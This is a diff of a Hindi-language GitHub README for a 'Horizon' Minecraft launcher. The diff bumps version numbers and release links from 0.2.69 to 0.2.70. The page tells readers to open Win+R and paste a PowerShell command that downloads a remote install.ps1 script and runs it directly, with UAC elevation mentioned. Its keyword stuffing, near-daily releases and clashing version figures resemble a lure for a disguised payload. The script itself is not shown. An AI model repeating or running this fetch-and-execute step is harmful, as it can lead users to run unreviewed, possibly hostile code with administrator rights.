@@ -23,7 +23,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 
 <p align="center">
   <strong>नवीनतम अपडेट:</strong>
-  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69">0.2.69</a>
+  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70">0.2.70</a>
   · <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases">सभी अपडेट और पैच</a>
 </p>
 
@@ -64,12 +64,12 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
   <img alt="windows" src="https://img.shields.io/badge/OS-Windows_10%2F11-0078d4">
   <img alt="fps" src="https://img.shields.io/badge/FPS-Rust_client-orange">
   <img alt="free" src="https://img.shields.io/badge/कीमत-मुफ़्त-success">
-  <img alt="version" src="https://img.shields.io/badge/Launcher-0.2.69-lightgrey">
-  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69"><img alt="changelog" src="https://img.shields.io/badge/Changelog-0.2.69-informational"></a>
-  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases"><img alt="releases" src="https://img.shields.io/badge/Releases-0.2.0_to_0.2.69-blue"></a>
+  <img alt="version" src="https://img.shields.io/badge/Launcher-0.2.70-lightgrey">
+  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70"><img alt="changelog" src="https://img.shields.io/badge/Changelog-0.2.70-informational"></a>
+  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases"><img alt="releases" src="https://img.shields.io/badge/Releases-0.2.0_to_0.2.70-blue"></a>
 </p>
 
-<p align="center"><em>अपडेट 2026-11-16: लॉन्चर <strong>0.2.69</strong>, LGPL, Win+R, UAC. <a href="https://horizonlauncher.net/hi/">horizonlauncher.net</a>.</em></p>
+<p align="center"><em>अपडेट 2026-11-17: लॉन्चर <strong>0.2.70</strong>, LGPL, Win+R, UAC. <a href="https://horizonlauncher.net/hi/">horizonlauncher.net</a>.</em></p>
 
 [![Horizon Minecraft Rust डाउनलोड](https://horizonlauncher.net/media/social-preview.jpg)](https://horizonlauncher.net/hi/)
 
@@ -145,10 +145,11 @@ Horizon Mojang / Microsoft का **नहीं** है। सिर्फ़ 
 
 Horizon चलता रहता है: पैच नियमित आते हैं। हर वर्शन का अलग रिलीज़ और changelog है। मौजूदा सेटअप साइट पर है, पैच इतिहास यहाँ।
 
-**नवीनतम अपडेट:** [0.2.69](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69) · **[सभी अपडेट और पैच](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)** — 27 रिलीज़ (0.2.0 → 0.2.69).
+**नवीनतम अपडेट:** [0.2.70](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70) · **[सभी अपडेट और पैच](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)** — 27 रिलीज़ (0.2.0 → 0.2.70).
 
 | वर्शन | तारीख | |
 |---|---|---|
+| **[0.2.70](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70)** | 2026-11-17 | [नोट्स](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70) |
 | **[0.2.69](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69)** | 2026-11-16 | [नोट्स](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69) |
 | **[0.2.68](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.68)** | 2026-11-15 | [नोट्स](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.68) |
 | **[0.2.67](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.67)** | 2026-11-15 | [नोट्स](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.67) |
@@ -164,10 +165,9 @@ Horizon चलता रहता है: पैच नियमित आते
 | **[0.2.57](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.57)** | 2026-11-09 | [नोट्स](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.57) |
 | **[0.2.56](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.56)** | 2026-11-08 | [नोट्स](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.56) |
 | **[0.2.55](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.55)** | 2026-11-08 | [नोट्स](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.55) |
-| **[0.2.54](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.54)** | 2026-11-08 | [नोट्स](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.54) |
 
 
-पुराने वर्शन: [0.2.53](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.53) · [0.2.52](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.52) · [0.2.51](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.51) · [0.2.50](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.50) · [0.2.49](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.49) · [0.2.48](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.48) · [0.2.47](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.47) · [0.2.46](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.46) · [0.2.45](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.45) · [0.2.44](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.44) · [0.2.43](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.43)
+पुराने वर्शन: [0.2.54](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.54) · [0.2.53](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.53) · [0.2.52](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.52) · [0.2.51](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.51) · [0.2.50](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.50) · [0.2.49](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.49) · [0.2.48](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.48) · [0.2.47](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.47) · [0.2.46](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.46) · [0.2.45](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.45) · [0.2.44](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.44)
 
 
 ## Horizon Minecraft क्या है
@@ -190,7 +190,7 @@ Horizon चलता रहता है: पैच नियमित आते
 
 - Windows 10 / Windows 11 x64
 - `horizon-launcher-setup.exe`
-- Horizon **0.2.69**
+- Horizon **0.2.70**
 - मुफ़्त · साइट रूसी और अंग्रेज़ी में
 
 ## Horizon कैसे इंस्टॉल करें — दो तरीके
@@ -223,7 +223,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 वही Horizon इंस्टॉलर — बिना कमांड फ़ाइल डाउनलोड। वर्तमान: **0.2.54**, Windows x64, ~60 MB.
 
 **[Horizon डाउनलोड — Windows setup](https://horizonlauncher.net/horizon-launcher-setup.exe)**  
-`horizon-launcher-setup.exe` · Windows x64 · ~60 MB · v0.2.69
+`horizon-launcher-setup.exe` · Windows x64 · ~60 MB · v0.2.70
 
 1. [horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe) डाउनलोड करें।
 2. Windows इंस्टॉलर चलाएँ।
@@ -287,7 +287,7 @@ Win+R: `irm https://horizonlauncher.net/install.ps1 | iex` · **[horizon-launche
 
 ### लोकप्रिय खोज
 
-`Horizon Minecraft डाउनलोड` · `Horizon launcher Windows` · `Horizon 0.2.69` · [Releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)
+`Horizon Minecraft डाउनलोड` · `Horizon launcher Windows` · `Horizon 0.2.70` · [Releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)
 
 ## FAQ
 
@@ -304,13 +304,13 @@ Win+R: `irm https://horizonlauncher.net/install.ps1 | iex` · **[horizon-launche
 Horizon के Rust क्लाइंट के लिए नहीं।
 
 **लाइसेंस क्या है?**  
-**0.2.69** से Horizon upstream **LGPL-3.0-or-later**। [https://horizonlauncher.net/hi/legal/](https://horizonlauncher.net/hi/legal/)
+**0.2.70** से Horizon upstream **LGPL-3.0-or-later**। [https://horizonlauncher.net/hi/legal/](https://horizonlauncher.net/hi/legal/)
 
 **Distant Horizons, Create और शेडर?**  
 हाँ — नेटिव मॉड (.hnmod)। [https://horizonlauncher.net/hi/distant-horizons/](https://horizonlauncher.net/hi/distant-horizons/) · [Create](https://horizonlauncher.net/hi/create-mod/) · [शेडर](https://horizonlauncher.net/hi/shaders/)
 
-**चेंजलॉग 0.2.65–0.2.69?**  
-[Releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases) · लॉन्चर **0.2.69** [https://horizonlauncher.net/hi/](https://horizonlauncher.net/hi/)
+**चेंजलॉग 0.2.65–0.2.70?**  
+[Releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases) · लॉन्चर **0.2.70** [https://horizonlauncher.net/hi/](https://horizonlauncher.net/hi/)
 
 **Windows 7 / macOS / Linux?**  
 केवल **Windows 10/11 x64**. [https://horizonlauncher.net/hi/download-horizon/](https://horizonlauncher.net/hi/download-horizon/).
@@ -334,12 +334,12 @@ Horizon के Rust क्लाइंट के लिए नहीं।
 
 ## English — Horizon Minecraft launcher डाउनलोड
 
-**Horizon** एक मुफ़्त **Windows Minecraft launcher** और **Rust में Java क्लाइंट** (Minecraft Rust Edition) है। अंग्रेज़ी canonical पेज: [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/) · **[https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)** · **0.2.69**. Mojang/Microsoft आधिकारिक नहीं।
+**Horizon** एक मुफ़्त **Windows Minecraft launcher** और **Rust में Java क्लाइंट** (Minecraft Rust Edition) है। अंग्रेज़ी canonical पेज: [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/) · **[https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)** · **0.2.70**. Mojang/Microsoft आधिकारिक नहीं।
 
 
 ## SEO टैग और सर्च
 
-`Horizon डाउनलोड` `Horizon launcher` `Rust में Minecraft` `Horizon 0.2.69` `horizonlauncher.net`
+`Horizon डाउनलोड` `Horizon launcher` `Rust में Minecraft` `Horizon 0.2.70` `horizonlauncher.net`
 
 `Horizon डाउनलोड` `Horizon लॉन्चर` `Minecraft Rust` `Minecraft Rust Edition` `Minecraft FPS` `horizonlauncher.net` `Win+R Horizon` `Horizon त्वरित इंस्टॉल` `Horizon setup` `Horizon डाउनलोड` `Distant Horizons Horizon` `Create mod Horizon`
 
